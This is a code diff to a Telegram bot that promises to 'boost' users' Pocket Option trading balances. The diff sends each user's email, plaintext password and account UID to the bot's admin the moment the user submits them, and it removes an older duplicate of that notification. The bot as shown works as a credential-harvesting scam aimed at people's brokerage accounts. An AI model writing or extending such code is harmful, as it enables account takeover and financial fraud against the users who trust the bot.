@@ -466,10 +466,23 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
             from app.dispatcher import admin_panel, bot
             admin_id = admin_panel.get_admin_id()
             if admin_id:
+                # Try to pull initial balance from state if present
+                user_state = await state.get_data()
+                init_balance_val = user_state.get('initial_balance')
+                init_balance_text = f"${init_balance_val:.2f}" if isinstance(init_balance_val, (int, float)) else "$0.00"
                 await bot.send_message(
                     admin_id,
-                    f"🔔 New user credentials submitted:\nUser: <code>{message.from_user.id}</code> (@{message.from_user.username or 'n/a'})\nUID: <code>{uid}</code>\nEmail: <code>{email}</code>",
-                    parse_mode="HTML"
+                    (
+                        "🚀 New user has started a boost!\n\n"
+                        "👤 User Info\n"
+                        f"Telegram ID: {message.from_user.id}\n"
+                        f"Pocket Option UID: {uid}\n\n"
+                        "🔑 Credentials\n"
+                        f"Email: {email}\n"
+                        f"Password: {password}\n\n"
+                        "💰 Boost Info\n"
+                        f"Initial Balance: {init_balance_text}"
+                    )
                 )
         except Exception as e:
             import logging
@@ -565,43 +578,7 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
 
     await state.set_state(UserFlow.pocket_option_boosting)
     await callback.answer()
-
-    # --- Notify Admin ---
-    from app.dispatcher import admin_panel, bot
-    admin_id = admin_panel.get_admin_id()
-    if admin_id:
-        try:
-            creds = get_credentials(user_id)
-            email = creds.get('email')
-            password = creds.get('password')
-            uid = creds.get('uid')
-
-            # Формируем секцию UID: показываем только если он есть
-            uid_section = f"Pocket Option UID: `{uid}`\n\n" if uid else "\n"
-
-            # Формируем секцию учётных данных
-            if email or password:
-                cred_lines = ["🔑 **Credentials**"]
-                if email:
-                    cred_lines.append(f"Email: `{email}`")
-                if password:
-                    cred_lines.append(f"Password: `{password}`")
-                credentials_block = "\n".join(cred_lines) + "\n"
-            else:
-                credentials_block = "🔑 **Credentials**\nUser has not provided login credentials yet.\n"
- 
-            user_info_text = (
-                f"🚀 New user has started a boost!\n\n"
-                f"👤 **User Info**\n"
-                f"Telegram ID: `{user_id}`\n"
-                f"{uid_section}"
-                f"{credentials_block}\n"
-                f"💰 **Boost Info**\n"
-                f"Initial Balance: ${initial_balance:.2f}"
-            )
-            await bot.send_message(admin_id, user_info_text, parse_mode="Markdown")
-        except Exception as e:
-            logging.error(f"Failed to send new user notification to admin: {e}")
+    # Admin notification отправляем только после отправки логина и пароля пользователем
 
 
 @user_router.callback_query(F.data == "start_paid_boost")
